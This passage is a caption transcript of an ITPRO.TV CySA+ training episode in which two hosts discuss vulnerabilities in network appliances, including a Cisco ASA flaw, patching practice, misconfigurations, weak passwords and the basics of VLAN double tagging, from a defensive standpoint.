00:30:53.931\n[MUSIC]\n\n591\n00:30:53.931 -->

Francisco,\nCalifornia.\n\n3\n00:00:04.671 --> 00:00:07.051\n[CROSSTALK]\n\n4\n00:00:07.051 --> 00:00:08.762\n[MUSIC]\n\n5\n00:00:08.762 --> 00:00:11.296\n&gt;&gt; You're watching ITPRO.TV.\n\n6\n00:00:11.296 --> 00:00:14.870\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITPRO.TV.\n\n7\n00:00:14.870 --> 00:00:16.850\nI'm your host Mike Rodrick.\n\n8\n00:00:16.850 --> 00:00:19.044\nToday we're doing our CySA+.\n\n9\n00:00:19.044 --> 00:00:23.210\nIn this episode we're gonna be taking\na look at common vulnerabilities.\n\n10\n00:00:23.210 --> 00:00:24.070\nThis is a part three,\n\n11\n00:00:24.070 --> 00:00:27.140\nso if you've missed the first two parts\nmake sure you go back and watch those.\n\n12\n00:00:27.140 --> 00:00:29.930\nJoining us back in the studio is\nnone other than Mr. Daniel Lowrie.\n\n13\n00:00:29.930 --> 00:00:31.720\nWelcome back, Daniel.\n&gt;&gt; Thanks for having me, Mike,\n\n14\n00:00:31.720 --> 00:00:33.130\nalways a pleasure to see you.\n\n15\n00:00:33.130 --> 00:00:36.020\nAnd glad to see you on this show,\nI've been having a rotating host,\n\n16\n00:00:36.020 --> 00:00:38.655\nit's been a lot of fun and\neverybody brings something different.\n\n17\n00:00:38.655 --> 00:00:39.410\n&gt;&gt; We all wanna get in on the CYSA.\n\n18\n00:00:39.410 --> 00:00:40.756\n&gt;&gt; Yeah, it's so much fun, right?\n\n19\n00:00:40.756 --> 00:00:44.220\nTo learn about all these things and\nhow can we secure against\n\n20\n00:00:44.220 --> 00:00:46.570\ndifferent vulnerabilities that\nis what we are looking at today.\n\n21\n00:00:46.570 --> 00:00:48.560\nWhat are some of those common\nvulnerabilities that are out\n\n22\n00:00:48.560 --> 00:00:49.540\nthere that I have to worry about.\n\n23\n00:00:49.540 --> 00:00:53.200\nThe baddies,\nthe evil lurking in the hearts of men\n\n24\n00:00:53.200 --> 00:00:57.760\non the interwebs which is actually\npretty nasty to be honest with you.\n\n25\n00:00:57.760 --> 00:00:59.322\nThat's neither here nor there so\n\n26\n00:00:59.322 --> 00:01:02.509\nwe are just going to continue on\nwith what we were looking at before.\n\n27\n00:01:02.509 --> 00:01:05.832\nSo if you watched part one and two great,\nyou need to know those things for\n\n28\n00:01:05.832 --> 00:01:07.610\nyour exam and for your life.\n\n29\n00:01:07.610 --> 00:01:09.270\nPart three we're just\ngoing to keep moving on.\n\n30\n00:01:09.270 --> 00:01:11.180\nToday we're going to give you this song,\n\n31\n00:01:11.180 --> 00:01:15.360\nnetwork appliance kind of,\nking of vulnerabilities.\n\n32\n00:01:15.360 --> 00:01:17.040\nAnd that's where we're\ngonna start the show.\n\n33\n00:01:17.040 --> 00:01:18.830\n&gt;&gt; Got you.\nSo these are those devices that we plug\n\n34\n00:01:18.830 --> 00:01:21.180\nin to our network that\nkind of make things work.\n\n35\n00:01:21.180 --> 00:01:24.480\nNot necessarily a node that I sit at and\ncompute with but\n\n36\n00:01:24.480 --> 00:01:29.120\ndevices that we have on our network\nthat provide our interconnectivity.\n\n37\n00:01:29.120 --> 00:01:30.820\n&gt;&gt; I like that, yes, exactly.\n\n38\n00:01:30.820 --> 00:01:35.270\nIt's those bits and pieces out there that\nyou normally don't have to go anything\n\n39\n00:01:35.270 --> 00:01:38.340\nwith because once it's configured\nit's running and everything is happy.\n\n40\n00:01:38.340 --> 00:01:41.960\nIt's only when things go wrong\nthat you tend to think about them.\n\n41\n00:01:41.960 --> 00:01:45.240\nI can't get access to the internet, what\nthe heck is wrong with you, stupid box.\n\n42\n00:01:45.240 --> 00:01:47.017\nYou're hitting it and doing things.\n\n43\n00:01:47.017 --> 00:01:52.735\nBut these are our routers, our switches,\nour access points, things of that nature.\n\n44\n00:01:52.735 --> 00:01:55.087\nEven if you're in a larger corporation,\n\n45\n00:01:55.087 --> 00:01:58.525\nthings like load balancers and\nVPN concentrators, right?\n\n46\n00:01:58.525 --> 00:02:03.300\nThere's replication devices, you name it,\nit's out there, a lot of cool stuff.\n\n47\n00:02:03.300 --> 00:02:06.120\nWe do have to worry about\nvulnerabilities with them, as well,\n\n48\n00:02:06.120 --> 00:02:09.710\nbecause the are nodes or\nhosts on our network.\n\n49\n00:02:09.710 --> 00:02:13.020\nAnd they do run software and\nhave vulnerabilities as well.\n\n50\n00:02:13.020 --> 00:02:17.110\n&gt;&gt; And would you say that might even add\nto the risk associated with these devices\n\n51\n00:02:17.110 --> 00:02:20.490\nbecause we don't login to them\neveryday and work with them.\n\n52\n00:02:20.490 --> 00:02:23.920\nThey are kind of a set it and\nforget it, you don't think about them.\n\n53\n00:02:23.920 --> 00:02:25.630\nWe don't update them\nas often as we should,\n\n54\n00:02:25.630 --> 00:02:29.020\nwe don't check in to make sure they're\nnot running some kind of malware already.\n\n55\n00:02:29.020 --> 00:02:31.230\n&gt;&gt; Yeah, Mike,\nyou're just full of good points today.\n\n56\n00:02:31.230 --> 00:02:33.900\nI'm so glad you're here\nbecause that's exactly right.\n\n57\n00:02:33.900 --> 00:02:37.188\nWe kinda out of sight,\nout of mind with these in a lot of ways.\n\n58\n00:02:37.188 --> 00:02:39.845\nThink of your firewalls as well.\n\n59\n00:02:39.845 --> 00:02:42.730\nIt's all these, basically,\nexcept for the switches, even then,\n\n60\n00:02:42.730 --> 00:02:44.610\nyou get the multi-layer switches.\n\n61\n00:02:44.610 --> 00:02:49.260\nIn a router kind of idea, firewalls are\njust basically a router with cool KCLs,\n\n62\n00:02:49.260 --> 00:02:50.635\nbut they're network devices.\n\n63\n00:02:50.635 --> 00:02:55.100\nA load balancer, again just a kind\nof cool firewall, not firewall\n\n64\n00:02:55.100 --> 00:03:00.390\nrouter technology that goes I can split\nthese signals out and load balance.\n\n65\n00:03:00.390 --> 00:03:00.997\nVery fun.\n\n66\n00:03:00.997 --> 00:03:03.588\nBut what are some of the vulnerabilities?\n\n67\n00:03:03.588 --> 00:03:08.140\nWe're shooting this as of May 2018 and\nto be honest with you there is a company,\n\n68\n00:03:08.140 --> 00:03:12.210\nyou may have heard of them, they're\na little known entity know is Cisco.\n\n69\n00:03:12.210 --> 00:03:17.040\nThey've actually had a little\ntrouble here recently with\n\n70\n00:03:17.040 --> 00:03:21.020\nsome remote code execution vulnerabilities\nand denial of service attack\n\n71\n00:03:21.020 --> 00:03:26.430\nvulnerabilities in their operating systems\nfor their KSA which is their firewall.\n\n72\n00:03:26.430 --> 00:03:29.050\nBut I think it might have affected\nsome of their routers as well.\n\n73\n00:03:29.050 --> 00:03:33.940\nBut the point is that these devices\nare not immune to problems.\n\n74\n00:03:33.940 --> 00:03:37.680\nMike, you brought up a really good point\nwhich was, because they're out of sight,\n\n75\n00:03:37.680 --> 00:03:38.190\nout of mind,\n\n76\n00:03:38.190 --> 00:03:44.250\nwe might not be doing our due diligence\nwhen it comes to updates and things.\n\n77\n00:03:44.250 --> 00:03:47.305\nPlus we're really gun-shy, or\n\n78\n00:03:47.305 --> 00:03:52.329\nafraid to mess with anything\nthat is working, right?\n\n79\n00:03:52.329 --> 00:03:52.900\n&gt;&gt; Right.\n\n80\n00:03:52.900 --> 00:03:57.287\n&gt;&gt; The known factor that\nwell it is working now, and\n\n81\n00:03:57.287 --> 00:04:01.250\nit is critical infrastructure to my world.\n\n82\n00:04:01.250 --> 00:04:06.240\nIf I apply a patch and it goes down,\nthen I'm in really big trouble.\n\n83\n00:04:06.240 --> 00:04:08.140\nPeople are gonna be\nbreathing down my neck,\n\n84\n00:04:08.140 --> 00:04:09.910\nwe gotta get the network back, right?\n\n85\n00:04:09.910 --> 00:04:13.970\nSo it makes us a little gun shy\nwhen it comes to messing with stuff\n\n86\n00:04:13.970 --> 00:04:15.680\nthat we know is working, and I get that.\n\n87\n00:04:15.680 --> 00:04:17.658\nI get that.\nMike, I'm sure you get that.\n\n88\n00:04:17.658 --> 00:04:20.890\nYeah, you really don't wanna be\nthe guy that brought the router down.\n\n89\n00:04:20.890 --> 00:04:24.130\nThat applied a patch, thinking you\nwere doing the right thing, and\n\n90\n00:04:24.130 --> 00:04:25.950\nit went south on you.\n\n91\n00:04:25.950 --> 00:04:27.084\nBut at the same time,\n\n92\n00:04:27.084 --> 00:04:31.448\nyou don't wanna be the one that is running\nfirmware that's two years out of date.\n\n93\n00:04:31.448 --> 00:04:33.232\nAnd has known vulnerabilities and\n\n94\n00:04:33.232 --> 00:04:36.626\nknown patches that you could've\nprevented this kind of attack.\n\n95\n00:04:36.626 --> 00:04:37.810\nYou don't wanna be that guy, either.\n\n96\n00:04:37.810 --> 00:04:41.580\nSo you gotta probably err\non the side of safety.\n\n97\n00:04:41.580 --> 00:04:44.990\nI know, Mike, how many times have you\nread a security blog and it's such and\n\n98\n00:04:44.990 --> 00:04:46.910\nsuch a breach just happened?\n\n99\n00:04:46.910 --> 00:04:52.910\nAnd we've discussed this, this is\na continuing conversation we keep having.\n\n100\n00:04:52.910 --> 00:04:57.600\nIt's still relevant which is\nthere was the data breach and\n\n101\n00:04:57.600 --> 00:05:01.640\nit was due to a vulnerability\nin there's blank software or\n\n102\n00:05:01.640 --> 00:05:06.170\nsystem that has had a patch\naround since 2013, or 2016.\n\n103\n00:05:06.170 --> 00:05:11.150\n&gt;&gt; And these are big companies,\norganizations that you know\n\n104\n00:05:11.150 --> 00:05:13.410\nhave the resources,\nknow these updates are available.\n\n105\n00:05:13.410 --> 00:05:15.600\n&gt;&gt; Right.\n&gt;&gt; They have the resources to apply these\n\n106\n00:05:15.600 --> 00:05:17.610\nupdates, and yet they don't.\n\n107\n00:05:17.610 --> 00:05:18.110\n&gt;&gt; They don't.\n&gt;&gt; And\n\n108\n00:05:18.110 --> 00:05:22.030\nyou wonder why, most like, well,\nyou can't assume anything.\n\n109\n00:05:22.030 --> 00:05:25.320\n&gt;&gt; Right, but\nI think one of the main reasons is\n\n110\n00:05:25.320 --> 00:05:27.710\nthey just have never set\nup a good patching cycle.\n\n111\n00:05:27.710 --> 00:05:31.830\nSomething where they have a defined set\nof parameters to say here's how often and\n\n112\n00:05:31.830 --> 00:05:33.420\nwhen we should patch.\n\n113\n00:05:33.420 --> 00:05:35.320\nAlso, and we've talked about this,\n\n114\n00:05:35.320 --> 00:05:39.030\nagain continuing that\nconversation of do sandboxing.\n\n115\n00:05:39.030 --> 00:05:43.810\nHave a test environment to where, yes,\nI am worried about applying a patch that\n\n116\n00:05:43.810 --> 00:05:47.590\nwill take our network down and\nthen I have to backpedal as fast as I can.\n\n117\n00:05:47.590 --> 00:05:49.270\nHow about I apply it to\nmy test network first,\n\n118\n00:05:49.270 --> 00:05:52.450\nthat is running the same basic equipment\nthat is in my production environment,\n\n119\n00:05:52.450 --> 00:05:53.650\nto see if anything happens there?\n\n120\n00:05:53.650 --> 00:05:57.870\nIf not, I will feel a whole lot safer,\nplus you've done your due diligence\n\n121\n00:05:57.870 --> 00:06:03.190\nin trying to maintain safety and\nuptime as much as possible.\n\n122\n00:06:03.190 --> 00:06:06.700\nSo that if it does go down, you say,\nwe'll I've done all my due diligence,\n\n123\n00:06:06.700 --> 00:06:10.732\nthis patch is critical we must\nbe applying security patches.\n\n124\n00:06:10.732 --> 00:06:14.990\nBecause yes we may be down\nright now due to a little\n\n125\n00:06:14.990 --> 00:06:20.160\nhiccup in our giddyup as far\nas the iOS is concerned.\n\n126\n00:06:20.160 --> 00:06:23.630\nBut how much worse would it\nbe if it was a data breach?\n\n127\n00:06:23.630 --> 00:06:24.250\n&gt;&gt; Right.\n&gt;&gt; Right?\n\n128\n00:06:24.250 --> 00:06:27.960\nSo, these are our risk factors\nthat we have to weigh and\n\n129\n00:06:27.960 --> 00:06:29.690\nfigure out what is acceptable and\nwhat's not.\n\n130\n00:06:29.690 --> 00:06:31.200\nI think having a little\nbit of downside to it,\n\n131\n00:06:31.200 --> 00:06:36.080\nhaving a little back of patch is a much\nmore acceptable item than going to hey,\n\n132\n00:06:36.080 --> 00:06:38.685\nwe just had all our\nintellectual property stolen.\n\n133\n00:06:38.685 --> 00:06:39.730\n[LAUGH]\n&gt;&gt; Yeah, absolutely.\n\n134\n00:06:39.730 --> 00:06:41.090\nIt reminds me of this old,\n\n135\n00:06:41.090 --> 00:06:44.940\nit was a Dilbert cartoon\nthat I think is appropriate.\n\n136\n00:06:44.940 --> 00:06:46.980\nIt says we had a massive data breach,\n\n137\n00:06:46.980 --> 00:06:49.820\nhackers got into our private data,\nof all of our customers.\n\n138\n00:06:49.820 --> 00:06:50.550\nHey no problem,\n\n139\n00:06:50.550 --> 00:06:54.640\nwe'll issue a press release that says\nwe're sorry, it will never happen again.\n\n140\n00:06:54.640 --> 00:06:57.410\nIsn't that what we said the last\nthree times it happened?\n\n141\n00:06:57.410 --> 00:06:58.675\nOur strategy is to wear them down.\n\n142\n00:06:58.675 --> 00:07:02.980\nBut that's what you want to avoid, you\ndon't want to be that organization that\n\n143\n00:07:02.980 --> 00:07:06.720\nhas to come out and say, hey look\nwe're sorry, we had a data breach.\n\n144\n00:07:06.720 --> 00:07:08.900\nWe're doing what we can to fix it.\n\n145\n00:07:08.900 --> 00:07:12.350\nWe'd much rather be the company that\nmaybe had a little down time, but\n\n146\n00:07:12.350 --> 00:07:15.100\ngot those patches applied and\nthe customers data safe.\n\n147\n00:07:15.100 --> 00:07:15.870\n&gt;&gt; Yeah, agreed.\n\n148\n00:07:15.870 --> 00:07:20.450\nIt can, even if nothing super\ndevastating happened, it can still\n\n149\n00:07:20.450 --> 00:07:24.740\ndamage your public facing, that\nrelationship you have with your public.\n\n150\n00:07:24.740 --> 00:07:26.850\nSo you don't want that.\n\n151\n00:07:26.850 --> 00:07:29.480\nAll right,\nI did bring up a CVE about this, so\n\n152\n00:07:29.480 --> 00:07:32.940\nyou guys can take a look at just\nthese common vulnerabilities.\n\n153\n00:07:32.940 --> 00:07:38.455\nHere it is, let me zoom in cuz\nit's a little janky there.\n\n154\n00:07:38.455 --> 00:07:43.010\nCVE-2018-101 and this is talking\nabout both remote code execution and\n\n155\n00:07:43.010 --> 00:07:44.110\ndenial of service.\n\n156\n00:07:44.110 --> 00:07:46.615\nAll rolled into one exciting exploit.\n\n157\n00:07:46.615 --> 00:07:48.906\n&gt;&gt; [LAUGH]\n&gt;&gt; So be prepared for that.\n\n158\n00:07:48.906 --> 00:07:53.058\nA vulnerability in the SSL layer\nof the VPN functionality of\n\n159\n00:07:53.058 --> 00:07:57.624\nthe Cisco Adaptive Security Appliance,\nor ASA, software could\n\n160\n00:07:57.624 --> 00:08:02.467\nallow an unauthenticated, remote attacker\n&gt;&gt; To cause a reload of the effected\n\n161\n00:08:02.467 --> 00:08:02.967\nsystem.\n\n162\n00:08:02.967 --> 00:08:07.634\nEffectively a denial of servicing,\nso we'll reroll as much\n\n163\n00:08:07.634 --> 00:08:12.128\nas they tell it to or\nas we go back to remotely execute code.\n\n164\n00:08:12.128 --> 00:08:18.443\nSo this will do both and it goes into a\nbit more of the detail of what's going on\n\n165\n00:08:18.443 --> 00:08:23.477\nwith the crafted XML packets\nthat you will send your device,\n\n166\n00:08:23.477 --> 00:08:28.138\nthat it will then interpret and\ndo what you want it to do.\n\n167\n00:08:28.138 --> 00:08:32.953\nSo we can even look at,\nlet me just scroll down here and\n\n168\n00:08:32.953 --> 00:08:37.768\ngo to Exploit DB here and\nhere is the unavailable group\n\n169\n00:08:37.768 --> 00:08:42.270\nof concept as far as the code\ngoes in exportation.\n\n170\n00:08:42.270 --> 00:08:45.630\nAnd you can see this all right here\nis that wonderful XML version and\n\n171\n00:08:45.630 --> 00:08:47.494\nthey've got it all built-in here.\n\n172\n00:08:47.494 --> 00:08:49.813\nSo you can use this as your structure,\n\n173\n00:08:49.813 --> 00:08:54.177\nif you wanted to attempt this attack\nto see if you were vulnerable to it.\n\n174\n00:08:54.177 --> 00:08:55.857\nI just wanted to give\nyou guys a look at this.\n\n175\n00:08:55.857 --> 00:08:56.959\nThis is 2018.\n\n176\n00:08:56.959 --> 00:09:00.295\nYeah, it was a couple month\nago that this occurred.\n\n177\n00:09:00.295 --> 00:09:03.323\nI think it was in March,\n[COUGH] but they'll just let\n\n178\n00:09:03.323 --> 00:09:07.840\nyou know that no matter what device\nyou're running, ASAs are very common.\n\n179\n00:09:07.840 --> 00:09:11.390\nThey're very popular, because they\ndo a great job of what they do.\n\n180\n00:09:11.390 --> 00:09:15.382\nThey are worth what you pay for\nthem when putting them on your network.\n\n181\n00:09:15.382 --> 00:09:17.952\nBut you do just because they're great and\nthey cost a little bit of money,\n\n182\n00:09:17.952 --> 00:09:19.833\nit doesn't mean they don't\nhave vulnerabilities.\n\n183\n00:09:19.833 --> 00:09:21.647\nYou have to look out for these things.\n\n184\n00:09:21.647 --> 00:09:25.340\nYou have to setup\na schedule where you say,\n\n185\n00:09:25.340 --> 00:09:29.349\nI'm going to updates our\ndevices at XYZ time.\n\n186\n00:09:29.349 --> 00:09:32.632\nThat's gonna cost some consternation\nmaybe with C level stuff, so\n\n187\n00:09:32.632 --> 00:09:33.909\nyou got to get that buy in.\n\n188\n00:09:33.909 --> 00:09:37.819\nBut I think if you show them the risks\nthat are associated with these things and\n\n189\n00:09:37.819 --> 00:09:40.646\nsome of the devastation that\ncan occur because of them,\n\n190\n00:09:40.646 --> 00:09:43.590\nthen that will get that\nbuy-in that you need.\n\n191\n00:09:43.590 --> 00:09:47.720\nA couple other things, really simple\nstuff when it comes to network\n\n192\n00:09:47.720 --> 00:09:52.290\nappliances that can cause data breach or\njust a vulnerability in general.\n\n193\n00:09:52.290 --> 00:09:54.074\nMisconfigurations.\n\n194\n00:09:54.074 --> 00:09:56.629\nYeah, I'm configuring the firewall and\n\n195\n00:09:56.629 --> 00:10:00.724\nI'm putting all my little ACL\nstatements or whatever the case is.\n\n196\n00:10:00.724 --> 00:10:04.441\nMaybe it's a tracks connections,\ndoes the DPAC inspection,\n\n197\n00:10:04.441 --> 00:10:06.420\nall that other good stuff.\n\n198\n00:10:06.420 --> 00:10:10.980\nIf you put the wrong thing in,\nit could allow for\n\n199\n00:10:10.980 --> 00:10:15.270\nsomeone to be able to actually get around\neverything that you were trying to do.\n\n200\n00:10:15.270 --> 00:10:19.260\nSo just one wrong allow\nstatement could be the lynchpin\n\n201\n00:10:19.260 --> 00:10:22.392\nthat brings the whole house of cards down.\n\n202\n00:10:22.392 --> 00:10:25.650\nSo you just have to be very careful\nwhen it comes to configurations.\n\n203\n00:10:25.650 --> 00:10:28.072\nMake sure you don't use simple things.\n\n204\n00:10:28.072 --> 00:10:30.232\nIf there's passwords,\nuse complex passwords.\n\n205\n00:10:30.232 --> 00:10:33.977\nDo good security practices when\nit comes to configuration.\n\n206\n00:10:33.977 --> 00:10:37.345\nDocument all of this, obviously, so\nthat it's there for anybody that needs it.\n\n207\n00:10:37.345 --> 00:10:40.031\nBecause if you are increasing security,\n\n208\n00:10:40.031 --> 00:10:43.263\nthen the usability is going\nto go down quite a bit.\n\n209\n00:10:43.263 --> 00:10:44.797\nAnd the more you increase security,\nanyway.\n\n210\n00:10:44.797 --> 00:10:46.631\nCuz usually that's sliding scale.\n\n211\n00:10:46.631 --> 00:10:51.167\nWe try to do what we can to make\nsystem secure and easy to use.\n\n212\n00:10:51.167 --> 00:10:53.953\nSometimes that works out and\nsometimes it doesn't, so\n\n213\n00:10:53.953 --> 00:10:57.758\njust be aware that misconfigurations\ncould be devastating to your system.\n\n214\n00:10:57.758 --> 00:11:03.351\nBecause I'm basically opening the back\ndoor while I'm putting both in chains and\n\n215\n00:11:03.351 --> 00:11:04.980\nbars on the front door.\n\n216\n00:11:04.980 --> 00:11:06.974\nSo we don't wanna do that.\n\n217\n00:11:06.974 --> 00:11:10.410\nWeak security or no security at all.\n\n218\n00:11:10.410 --> 00:11:14.884\nMike ever encounter some of those hey,\nI just set up this device.\n\n219\n00:11:14.884 --> 00:11:16.406\nI plugged it in, I turned it on, it works.\n\n220\n00:11:16.406 --> 00:11:17.378\n&gt;&gt; Yes, absolutely.\n\n221\n00:11:17.378 --> 00:11:20.922\nLeave everything in the default\nconfiguration and just walk away, but\n\n222\n00:11:20.922 --> 00:11:22.102\nI've seen people get so\n\n223\n00:11:22.102 --> 00:11:26.015\nexcited that they've got this new piece\nof hardware that they'll plug it in.\n\n224\n00:11:26.015 --> 00:11:29.333\nIt comes in on a Friday afternoon,\nthey've got to take it out of the box.\n\n225\n00:11:29.333 --> 00:11:32.549\nYou wanna see those lights light up,\nthey plug it into the network.\n\n226\n00:11:32.549 --> 00:11:34.323\nThey're super excited.\n\n227\n00:11:34.323 --> 00:11:35.788\nWoohoo, it's done.\n\n228\n00:11:35.788 --> 00:11:37.791\nWe'll be back Monday to configure it.\n\n229\n00:11:37.791 --> 00:11:40.245\nYeah, by Monday,\nit's not their device anymore.\n\n230\n00:11:40.245 --> 00:11:41.936\n&gt;&gt; No, no, somebody else owns that device.\n\n231\n00:11:41.936 --> 00:11:46.719\n[LAUGH] So we want no security Never.\n\n232\n00:11:46.719 --> 00:11:48.781\nI know it's a weird like double\nnegative sentence there.\n\n233\n00:11:48.781 --> 00:11:53.679\nBut what I mean is if you are not\nusing security at all, that's bad.\n\n234\n00:11:53.679 --> 00:11:57.172\nThat's no bueno as we say here in Florida.\n\n235\n00:11:57.172 --> 00:11:58.404\n&gt;&gt; [LAUGH]\n&gt;&gt; There's no bueno.\n\n236\n00:11:58.404 --> 00:11:59.204\n&gt;&gt; It's no bueno.\n\n237\n00:11:59.204 --> 00:12:01.109\nDon't do that, we want security.\n\n238\n00:12:01.109 --> 00:12:04.845\nAnd if you are going to use security,\ndon't use weak security.\n\n239\n00:12:04.845 --> 00:12:10.275\nAnd if you know that some security\nfeatures that are maybe available\n\n240\n00:12:10.275 --> 00:12:16.000\non your device, but aren't as robust\nas others, don't employ them.\n\n241\n00:12:16.000 --> 00:12:20.101\nReally, the only reasons you should be\nusing weaker security is to support\n\n242\n00:12:20.101 --> 00:12:25.250\nlegacy systems that don't support\nmore modern robust security features.\n\n243\n00:12:25.250 --> 00:12:29.330\nSo if you must go down that road,\nthat should be the reason and\n\n244\n00:12:29.330 --> 00:12:34.130\nthen you should have a strategy to exit\nout of that as soon as possible and\n\n245\n00:12:34.130 --> 00:12:38.387\nupgrade your system into a more modern,\nsecure environment.\n\n246\n00:12:38.387 --> 00:12:42.235\nThat's your end goal as a blue teamer.\n\n247\n00:12:42.235 --> 00:12:46.851\nSo these are things like also\npasswords and encryptions.\n\n248\n00:12:46.851 --> 00:12:48.364\nDon't use weak passwords.\n\n249\n00:12:48.364 --> 00:12:53.052\nI know passwords by nature are kind\nof a weak spot now a days, but\n\n250\n00:12:53.052 --> 00:12:55.456\nthat doesn't mean we are okay.\n\n251\n00:12:55.456 --> 00:12:59.221\nWe're not Joe Schmo user out there\non his desk going I hate my pass,\n\n252\n00:12:59.221 --> 00:13:02.325\nyou're gonna make me use\nthis fake carrier password.\n\n253\n00:13:02.325 --> 00:13:08.542\nIt's just like using the work help or\ntest or whatever, some dumb password.\n\n254\n00:13:08.542 --> 00:13:09.878\nWe are security people.\n\n255\n00:13:09.878 --> 00:13:11.280\nThat's just part of the,\nthat's the name of the game.\n\n256\n00:13:11.280 --> 00:13:13.123\nThat's why we got in the business, so\n\n257\n00:13:13.123 --> 00:13:16.751\nwe could prove our worth as security\npractitioners and part of that is being\n\n258\n00:13:16.751 --> 00:13:20.740\nable to create password that's going to\nbe quite difficult for someone to crack.\n\n259\n00:13:20.740 --> 00:13:22.061\nSo do that.\n\n260\n00:13:22.061 --> 00:13:27.469\nDocument it in the proper way, so\nit's not easily gathered by bad people.\n\n261\n00:13:27.469 --> 00:13:31.324\n&gt;&gt; Yeah, and you gotta remember\nthis isn't your desktop password.\n\n262\n00:13:31.324 --> 00:13:33.685\nThe one that gotta log on with everyday,\n\n263\n00:13:33.685 --> 00:13:38.547\nthis is the one on that interconnectivity\ndevice that you log into occassionally to\n\n264\n00:13:38.547 --> 00:13:41.961\napply updates to change\nconfiguration things like that.\n\n265\n00:13:41.961 --> 00:13:45.489\nSo having a good long 20\nsomething character password,\n\n266\n00:13:45.489 --> 00:13:47.074\nit is really not that bad.\n\n267\n00:13:47.074 --> 00:13:49.152\nYou're not typing it in 20 times a day.\n\n268\n00:13:49.152 --> 00:13:50.341\n&gt;&gt; Yeah, exactly.\n\n269\n00:13:50.341 --> 00:13:53.173\nMike, it's like he's done this before.\n\n270\n00:13:53.173 --> 00:13:55.642\nHe knows what the heck he's talking about,\nbecause he does.\n\n271\n00:13:55.642 --> 00:13:57.914\nSo listen to him, smart man.\n\n272\n00:13:57.914 --> 00:13:58.883\nLets move on to switches.\n\n273\n00:13:58.883 --> 00:14:03.108\nSwitches are even though we've been\ntalking about things like firewalls and\n\n274\n00:14:03.108 --> 00:14:06.110\nrouters, and a little balances and\nthings like that.\n\n275\n00:14:06.110 --> 00:14:09.382\nBasically, a bunch of glorified\nrouters to be honest with you.\n\n276\n00:14:09.382 --> 00:14:11.222\nBut switches can be different,\n\n277\n00:14:11.222 --> 00:14:16.073\nthere are multi layer switches which have\nrouting capabilities built-in to them.\n\n278\n00:14:16.073 --> 00:14:18.478\nBut switches kind of work\non a different level for\n\n279\n00:14:18.478 --> 00:14:21.539\nthe most part when we think of\nthem properly per se as it would.\n\n280\n00:14:21.539 --> 00:14:25.539\nWe're thinking that later to a device and\nthere are some interesting.\n\n281\n00:14:25.539 --> 00:14:29.941\nWell, specifically for the exam that\nwe wanna call out which is a couple of\n\n282\n00:14:29.941 --> 00:14:33.846\nthe tags that are available for\nit which is VLAN double tagging and\n\n283\n00:14:33.846 --> 00:14:37.901\nVLAN hopping and one kind of leads\nto the other to be honest with you.\n\n284\n00:14:37.901 --> 00:14:39.333\nSo it's interesting stuff.\n\n285\n00:14:39.333 --> 00:14:42.648\nI know there can be a bit of\nconfusion around how this works,\n\n286\n00:14:42.648 --> 00:14:46.178\nbecause it's confusing on how\nthis works and word of warning.\n\n287\n00:14:46.178 --> 00:14:47.944\nIf you're like man, this sounds cool.\n\n288\n00:14:47.944 --> 00:14:49.039\nI'm gonna go do that,\n\n289\n00:14:49.039 --> 00:14:52.855\nyou're probably not gonna have a lot\nof success with it in today's networks.\n\n290\n00:14:52.855 --> 00:14:56.549\nBut it is something that you have to\nworry about, because of what we were just\n\n291\n00:14:56.549 --> 00:14:59.960\ntalking about with people with legacy\nsystems still running around or\n\n292\n00:14:59.960 --> 00:15:02.618\nmisconfigurations could cause\na problem and allow for\n\n293\n00:15:02.618 --> 00:15:05.066\nthese types of attack even\nwith modern hardware.\n\n294\n00:15:05.066 --> 00:15:09.464\nSo what is this double tagging\nbusiness of which I speak?\n\n295\n00:15:09.464 --> 00:15:12.656\nWell, let me bring out, or hoping as well.\n\n296\n00:15:12.656 --> 00:15:13.815\nThis kinda go hand in hand.\n\n297\n00:15:13.815 --> 00:15:16.650\nLet me bring a little\ndiagram that I have created.\n\n298\n00:15:16.650 --> 00:15:21.015\nAnd hopefully,\nthis will help us vet this idea out.\n\n299\n00:15:21.015 --> 00:15:24.608\nLet me give you a little more\naction on the size quality.\n\n300\n00:15:24.608 --> 00:15:27.070\nThere we go, there we go.\n\n301\n00:15:27.070 --> 00:15:28.566\nSo what is going on?\n\n302\n00:15:28.566 --> 00:15:33.036\nWell, when you have switches, you have\nthese lovely things called VLANs and\n\n303\n00:15:33.036 --> 00:15:35.593\ntypically they are employed by the switch.\n\n304\n00:15:35.593 --> 00:15:40.957\nWhich is saying, I want to segment\nthis giant network that I have into\n\n305\n00:15:40.957 --> 00:15:46.887\nsmaller networks, so that I can segment\nHR's traffic from sales traffic.\n\n306\n00:15:46.887 --> 00:15:51.080\nThey don't need to talk together for the\nmost part and then you have a multi-layer\n\n307\n00:15:51.080 --> 00:15:55.056\nswitch, which allows the connection if\nI need it for some reason to go there.\n\n308\n00:15:55.056 --> 00:15:59.292\nBut their broadcast traffic isn't making\nit across, their own little domains and\n\n309\n00:15:59.292 --> 00:16:00.450\nthat's a good thing.\n\n310\n00:16:00.450 --> 00:16:03.540\nWe like that, it's a security feature and\nwe've talked about that.\n\n311\n00:16:03.540 --> 00:16:08.128\nBut the way VLANs work is when you're\n\n312\n00:16:08.128 --> 00:16:12.570\ndoing what's called .1Q VLANs.\n\n313\n00:16:12.570 --> 00:16:16.890\nIt's basically the tags that\nsay what VLAN am I on, okay?\n\n314\n00:16:16.890 --> 00:16:21.089\nSo when you creat a VLAN and\nsomethings on a VLAN and you, so\n\n315\n00:16:21.089 --> 00:16:27.209\nI've got a host on VLAN 1 or on VLAN 7 or\non VLAN 20 or whatever the case is, right?\n\n316\n00:16:27.209 --> 00:16:32.107\nWhen I put traffic on the network it\ngets flagged, or tagged should I say,\n\n317\n00:16:32.107 --> 00:16:36.775\nmore properly, as that VLAN's traffic so\nit knows what VLAN to be on.\n\n318\n00:16:36.775 --> 00:16:39.110\nNow the problem comes in when\nyou got these switches here.\n\n319\n00:16:39.110 --> 00:16:42.210\nAnd you notice that\nwe've got two switches.\n\n320\n00:16:42.210 --> 00:16:43.890\nAnd I've trunked them together.\n\n321\n00:16:43.890 --> 00:16:52.434\nAnd this trunking business can cause\na little bit of consternation.\n\n322\n00:16:52.434 --> 00:16:58.296\nSo what happens if I put two VLAN tags\non it using some software to manipulate\n\n323\n00:16:58.296 --> 00:17:03.709\nsome packets, or frames is the words,\nit's all ethernet, right?\n\n324\n00:17:03.709 --> 00:17:04.900\nWhat if I were to put that on there?\n\n325\n00:17:04.900 --> 00:17:05.831\nWhat would happen?\n\n326\n00:17:05.831 --> 00:17:09.610\nNow, again,\nyou're probably not gonna see 